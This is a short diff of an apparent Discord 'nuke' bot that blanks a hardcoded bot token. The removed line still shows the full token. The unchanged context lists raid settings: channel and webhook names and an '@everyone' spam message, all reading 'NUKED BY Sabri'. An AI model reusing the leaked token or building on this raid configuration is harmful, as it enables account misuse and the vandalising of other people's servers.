@@ -26,7 +26,7 @@ help_message = ('''
     :tada: : Affiche le crédit du créateur du bot.
 ''')
 
-token = 'MTEzMDg5Njc2ODg3NjQyOTQzNw.GVwQ3t.BiUQ8TLkAi8NWO-PmSqXKjoFrHqGF518Qn04Kk'
+token = ''
 channel_names = ['NUKED BY SABRI']
 message_spam = ['@everyone NUKED BY Sabri']
 webhook_names = ['NUKED BY Sabri']
